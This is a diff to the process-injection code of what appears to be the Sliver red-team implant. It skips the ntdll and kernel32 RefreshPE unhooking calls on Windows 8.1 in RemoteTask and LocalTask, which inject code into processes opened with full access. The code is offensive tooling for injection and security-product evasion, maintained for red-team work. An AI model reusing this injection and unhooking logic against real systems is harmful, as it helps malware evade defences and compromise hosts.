@@ -34,6 +34,8 @@ import (
 
 	// {{if .Debug}}
 	"log"
+
+	"github.com/bishopfox/sliver/sliver/version"
 	// {{else}}{{end}}
 )
 
@@ -283,19 +285,25 @@ func injectTask(processHandle syscall.Handle, data []byte, rwxPages bool) error 
 
 // RermoteTask - Injects Task into a processID using remote threads
 func RemoteTask(processID int, data []byte, rwxPages bool) error {
-	err := RefreshPE(ntdllPath)
-	if err != nil {
-		//{{if .Debug}}
-		log.Printf("RefreshPE on ntdll failed: %v\n", err)
-		//{{end}}
-		return err
-	}
-	err = RefreshPE(kernel32dllPath)
-	if err != nil {
-		//{{if .Debug}}
-		log.Printf("RefreshPE on kernel32 failed: %v\n", err)
-		//{{end}}
-		return err
+	var err error
+	// Hotfix for #114
+	// Somehow this fucks up everything on Windows 8.1
+	// so we're skipping the RefreshPE calls.
+	if version.GetVersion() != "6.3 build 9600" {
+		err = RefreshPE(ntdllPath)
+		if err != nil {
+			//{{if .Debug}}
+			log.Printf("RefreshPE on ntdll failed: %v\n", err)
+			//{{end}}
+			return err
+		}
+		err = RefreshPE(kernel32dllPath)
+		if err != nil {
+			//{{if .Debug}}
+			log.Printf("RefreshPE on kernel32 failed: %v\n", err)
+			//{{end}}
+			return err
+		}
 	}
 	processHandle, err := syscall.OpenProcess(PROCESS_ALL_ACCESS, false, uint32(processID))
 	if processHandle == 0 {
@@ -309,19 +317,25 @@ func RemoteTask(processID int, data []byte, rwxPages bool) error {
 }
 
 func LocalTask(data []byte, rwxPages bool) error {
-	err := RefreshPE(ntdllPath)
-	if err != nil {
-		//{{if .Debug}}
-		log.Printf("RefreshPE on ntdll failed: %v\n", err)
-		//{{end}}
-		return err
-	}
-	err = RefreshPE(kernel32dllPath)
-	if err != nil {
-		//{{if .Debug}}
-		log.Printf("RefreshPE on kernel32 failed: %v\n", err)
-		//{{end}}
-		return err
+	var err error
+	// Hotfix for #114
+	// Somehow this fucks up everything on Windows 8.1
+	// so we're skipping the RefreshPE calls.
+	if version.GetVersion() != "6.3 build 9600" {
+		err = RefreshPE(ntdllPath)
+		if err != nil {
+			//{{if .Debug}}
+			log.Printf("RefreshPE on ntdll failed: %v\n", err)
+			//{{end}}
+			return err
+		}
+		err = RefreshPE(kernel32dllPath)
+		if err != nil {
+			//{{if .Debug}}
+			log.Printf("RefreshPE on kernel32 failed: %v\n", err)
+			//{{end}}
+			return err
+		}
 	}
 	size := len(data)
 	addr, _ := sysAlloc(size, rwxPages)
